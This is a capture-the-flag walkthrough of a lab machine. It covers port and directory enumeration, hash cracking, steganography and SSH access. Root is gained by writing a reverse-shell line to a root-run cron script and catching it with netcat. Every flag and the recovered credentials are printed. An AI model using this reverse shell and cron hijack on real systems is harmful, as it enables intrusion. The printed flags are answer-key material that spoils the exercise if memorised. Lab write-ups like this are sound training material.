# Task 1: Enumeration through Nmap

## Question
> How many ports are open?
- Let's perform an `nmap` scan.
```
$ nmap -p- 10.10.34.245 -T5
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-13 09:36 IST
Warning: 10.10.34.245 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.34.245
Host is up (0.16s latency).
Not shown: 64479 closed tcp ports (conn-refused), 1053 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
6498/tcp  open  unknown
65524/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 542.41 seconds
```
- We can see that there are three open ports.
## Answer
```
3
```

## Question
>What is the version of nginx?
- Let's perform an in-depth scan on the open ports.
```
$ nmap -p 80,6498,65524 -A 10.10.34.245
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-13 09:49 IST
Nmap scan report for 10.10.34.245
Host is up (0.14s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.16.1
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
|_http-title: Apache2 Debian Default Page: It works
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.98 seconds
```

## Answer
```
1.16.1
```

## Question
> What is running on the highest port?

## Answer
```
Apache
```

# Task 2: Compromising the machine
## Question
> Using GoBuster, find flag 1.> 
- We can brute force the directories using `gobuster`.
```
$ gobuster dir -u http://10.10.34.245 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.34.245
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/hidden               (Status: 301) [Size: 169] [--> http://10.10.34.245/hidden/]
/index.html           (Status: 200) [Size: 612]
/robots.txt           (Status: 200) [Size: 43]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```
- As we can see there is a `/hidden` directory.
- Let's visit it.
```
$ gobuster dir -u http://10.10.34.245/hidden -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.34.245/hidden
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 390]
/whatever             (Status: 301) [Size: 169] [--> http://10.10.34.245/hidden/whatever/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

```
$ echo "ZmxhZ3tmMXJzN19mbDRnfQ==" | base64 -d       
flag{f1rs7_fl4g}                                                                                             
```
## Answer
```
flag{f1rs7_fl4g}
```

## Question
> Further enumerate the machine, what is flag 2?> 
- Let's perform a `gobuster` scan on port `65524`.
```
$ gobuster dir -u http://10.10.34.245:65524 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.34.245:65524
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 10818]
/robots.txt           (Status: 200) [Size: 153]
/server-status        (Status: 403) [Size: 280]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```
- We can now visit the `/robots.txt` page.
![[5 53.png]]
- Let's use `hash-identifier` to identify the hash.
```
$ hash-identifier a18672860d0510e5ab6699730763b250
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

![[6 44.png]]
## Answer
```
flag{1m_s3c0nd_fl4g}
```

## Question
> Crack the hash with easypeasy.txt, What is the flag 3?

![[15 4.png]]

## Answer
```
flag{9fdafbd64c47471a8f54cd3fc64cd312}
```


```
ObsJmP173N2X6dOrAgEAL0Vu
```

![[8 32.png]]

```
/n0th1ng3ls3m4tt3r
```



```
940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81 : mypasswordforthatjob
```

```
$ wget http://10.10.34.245:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg 
--2023-12-13 11:40:38--  http://10.10.34.245:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
Connecting to 10.10.34.245:65524... connected.
HTTP request sent, awaiting response... 200 OK
Length: 90158 (88K) [image/jpeg]
Saving to: ‘binarycodepixabay.jpg’

binarycodepixabay.jpg                                      100%[========================================================================================================================================>]  88.04K   112KB/s    in 0.8s    

2023-12-13 11:40:39 (112 KB/s) - ‘binarycodepixabay.jpg’ saved [90158/90158]
```

```
$ steghide extract -sf binarycodepixabay.jpg     
Enter passphrase: 
wrote extracted data to "secrettext.txt".
```

```
$ cat secrettext.txt                      
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```



| User   | Password                     |
| ------ | ---------------------------- |
| boring | iconvertedmypasswordtobinary |


```
$ ssh boring@10.10.34.245 -p 6498
The authenticity of host '[10.10.34.245]:6498 ([10.10.34.245]:6498)' can't be established.
ED25519 key fingerprint is SHA256:6XHUSqR7Smm/Z9qPOQEMkXuhmxFm+McHTLbLqKoNL/Q.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.34.245]:6498' (ED25519) to the list of known hosts.
*************************************************************************
**        This connection are monitored by government offical          **
**            Please disconnect if you are not authorized              **
** A lawsuit will be filed against you if the law is not followed      **
*************************************************************************
boring@10.10.34.245's password: 
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
boring@kral4-PC:~$ 
```

```
boring@kral4-PC:~$ cat user.txt
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}
```

## Answer
```
flag{n0wits33msn0rm4l}
```


## Question

```
boring@kral4-PC:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```

```
boring@kral4-PC:~$ ls -la /var/www/.mysecretcronjob.sh 
-rwxr-xr-x 1 boring boring 33 Jun 14  2020 /var/www/.mysecretcronjob.sh
```

```
boring@kral4-PC:/var/www$ ls -la
total 16
drwxr-xr-x  3 root   root   4096 Jun 15  2020 .
drwxr-xr-x 14 root   root   4096 Jun 13  2020 ..
drwxr-xr-x  4 root   root   4096 Jun 15  2020 html
-rwxr-xr-x  1 boring boring   81 Dec 12 22:51 .mysecretcronjob.sh
```

```
boring@kral4-PC:/var/www$ cat .mysecretcronjob.sh 
/bin/bash -i >& /dev/tcp/10.17.48.138/9999 0>&1
```

```
$ nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.17.48.138] from (UNKNOWN) [10.10.34.245] 50240
bash: cannot set terminal process group (2034): Inappropriate ioctl for device
bash: no job control in this shell
root@kral4-PC:/var/www#     
```

```
root@kral4-PC:~# ls -la /root
ls -la /root
total 40
drwx------  5 root root 4096 Jun 15  2020 .
drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
-rw-------  1 root root    2 Dec 12 22:52 .bash_history
-rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc
drwx------  2 root root 4096 Jun 13  2020 .cache
drwx------  3 root root 4096 Jun 13  2020 .gnupg
drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
```

```
root@kral4-PC:~# cat /root/.root.txt
cat /root/.root.txt
flag{63a9f0ea7bb98050796b649e85481845}
```